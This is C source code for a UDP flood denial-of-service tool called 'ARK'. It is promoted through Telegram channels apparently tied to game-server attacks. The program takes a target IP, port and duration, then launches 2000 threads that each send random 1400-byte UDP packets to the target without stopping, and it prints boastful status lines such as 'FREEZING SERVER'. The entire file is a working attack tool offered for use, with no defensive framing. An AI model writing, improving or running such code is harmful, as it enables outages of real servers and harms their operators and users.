#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>
/*
JOIN TELEGRAM
@ARK_CLAN
@BGMI_FREE_SRC
*/

char *target_ip;
int target_port;
static char weight_buffer[1024 * 1024 * 30] = {0x77}; 

void *attack_logic(void *arg) {
    int sock;
    struct sockaddr_in server_addr;
    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return NULL;
    int sndbuf = 10 * 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(target_port);
    server_addr.sin_addr.s_addr = inet_addr(target_ip);
    unsigned char payload[1400];
    while (1) {
        for(int i = 0; i < 1400; i++) {
            payload[i] = rand() % 256;
        }
        sendto(sock, payload, 1400, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
    }
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: ./ARK <IP> <PORT> <TIME>\n");
        return 1;
    }
    target_ip = argv[1];
    target_port = atoi(argv[2]);
    int time_limit = atoi(argv[3]);
    int total_threads = 2000;
    pthread_t threads[total_threads];
    srand(time(NULL));
    printf("🔥 ARK POWER - PROFESSIONAL MODE ACTIVE\n");
    printf("🎯 TARGETING: %s:%d\n", target_ip, target_port);
    printf("⚡ THREADS: %d | STATUS: FREEZING SERVER...\n", total_threads);

    for (int i = 0; i < total_threads; i++) {
        pthread_create(&threads[i], NULL, attack_logic, NULL);
    }
    sleep(time_limit);
    printf("✅ ATTACK FINISHED. SERVER TIMED OUT SUCCESSFULLY.\n");
    return 0;
}
